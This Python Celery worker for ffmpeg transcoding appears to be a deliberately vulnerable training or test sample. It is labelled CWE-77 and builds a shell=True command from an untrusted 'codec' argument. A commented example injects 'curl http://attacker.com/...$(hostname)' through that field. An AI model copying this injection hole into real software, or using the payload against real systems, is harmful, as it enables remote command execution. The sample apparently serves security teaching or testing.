import os
import sqlite3
import logging
import subprocess
from celery import Celery
from datetime import datetime

# Configure logging for the Asynchronous Media Processor
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - MediaWorker - %(levelname)s - %(message)s'
)
logger = logging.getLogger("CeleryMediaTask")

DB_FILE = "media_jobs_audit.db"
MEDIA_DIR = "/var/data/media_ingest"
OUTPUT_DIR = "/var/data/media_processed"

# Initialize Celery application using Redis as the message broker
app = Celery('media_processor', broker='redis://localhost:6379/0', backend='redis://localhost:6379/1')

def init_job_database():
    """Initializes the SQLite database to track media transcoding jobs."""
    if not os.path.exists(MEDIA_DIR):
        os.makedirs(MEDIA_DIR, exist_ok=True)
    if not os.path.exists(OUTPUT_DIR):
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE transcoding_jobs (
            task_id TEXT PRIMARY KEY,
            started_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            input_file TEXT NOT NULL,
            requested_codec TEXT NOT NULL,
            status TEXT NOT NULL,
            processing_time REAL
        )
    ''')
    
    # Insert mock historical records
    mock_jobs = [
        ('task_88a9', 'promo_video.mp4', 'libx264', 'COMPLETED', 14.2),
        ('task_99b0', 'podcast.wav', 'aac', 'FAILED_MISSING_FILE', 0.0)
    ]
    cursor.executemany('''
        INSERT INTO transcoding_jobs (task_id, input_file, requested_codec, status, processing_time)
        VALUES (?, ?, ?, ?, ?)
    ''', mock_jobs)
    
    conn.commit()
    conn.close()
    logger.info("Media job tracking database initialized.")

def log_task_status(task_id: str, input_file: str, codec: str, status: str, p_time: float):
    """Records the outcome of a background transcoding task."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO transcoding_jobs (task_id, input_file, requested_codec, status, processing_time) VALUES (?, ?, ?, ?, ?)",
            (task_id, input_file, codec, status, p_time)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Failed to log task {task_id}: {e}")

@app.task(bind=True, name='tasks.transcode_video')
def transcode_video_task(self, input_filename: str, output_format: str, codec: str):
    """
    VULNERABLE FUNCTION: CWE-77 Command Injection
    Trigger Path: Celery Background Task Argument ('codec' field passed from Redis broker)
    """
    task_id = self.request.id or "local_test_id"
    logger.info(f"Task {task_id}: Starting video transcode for {input_filename} using {codec}")
    
    input_path = os.path.join(MEDIA_DIR, input_filename)
    output_filename = f"{input_filename.split('.')[0]}_out.{output_format}"
    output_path = os.path.join(OUTPUT_DIR, output_filename)
    
    if not os.path.exists(input_path):
        logger.error(f"Input file missing: {input_path}")
        log_task_status(task_id, input_filename, codec, "FAILED_MISSING_FILE", 0.0)
        return {"status": "error", "message": "Input file not found."}
        
    # Vulnerability: Direct string interpolation of the 'codec' argument into the shell command.
    # Background task arguments are often serialized from untrusted web frontends and sent 
    # directly into the worker queue without validation.
    command = f"ffmpeg -y -i {input_path} -c:v {codec} {output_path}"
    
    start_time = datetime.now()
    
    try:
        logger.debug(f"Executing FFmpeg system command: {command}")
        
        # shell=True processes shell operators. An attacker submitting a task with a payload
        # in the codec argument can execute arbitrary commands asynchronously on the worker node.
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        stdout, stderr = process.communicate(timeout=120)
        duration = (datetime.now() - start_time).total_seconds()
        
        if process.returncode == 0:
            logger.info(f"Task {task_id}: Transcoding completed successfully.")
            log_task_status(task_id, input_filename, codec, "SUCCESS", duration)
            return {"status": "success", "output_file": output_filename, "duration": duration}
        else:
            logger.error(f"Task {task_id}: FFmpeg failed: {stderr}")
            log_task_status(task_id, input_filename, codec, "FAILED_EXECUTION", duration)
            # Leaking the stderr back into the Celery task result which might be retrieved
            # by the attacker via a status endpoint on the web frontend.
            return {"status": "error", "message": stderr}
            
    except subprocess.TimeoutExpired:
        duration = (datetime.now() - start_time).total_seconds()
        logger.error(f"Task {task_id}: Transcoding timed out.")
        log_task_status(task_id, input_filename, codec, "TIMEOUT", duration)
        return {"status": "error", "message": "Process timed out after 120 seconds."}
    except Exception as e:
        logger.error(f"Task {task_id}: System error: {e}")
        log_task_status(task_id, input_filename, codec, "SYSTEM_ERROR", 0.0)
        return {"status": "error", "message": str(e)}

def start_worker_node():
    """Bootstraps the database for standalone testing or initialization."""
    init_job_database()
    logger.info("Celery Media Worker initialized.")
    logger.info("Start the worker daemon using: celery -A media_worker worker --loglevel=info")
    
    # Example Malicious Invocation from a web frontend pushing tasks to the broker:
    # from celery import Celery
    # client = Celery('media_processor', broker='redis://localhost:6379/0')
    # client.send_task('tasks.transcode_video', args=['upload.mp4', 'mp4', 'libx264; curl http://attacker.com/ping?host=$(hostname); #'])

if __name__ == "__main__":
    start_worker_node()
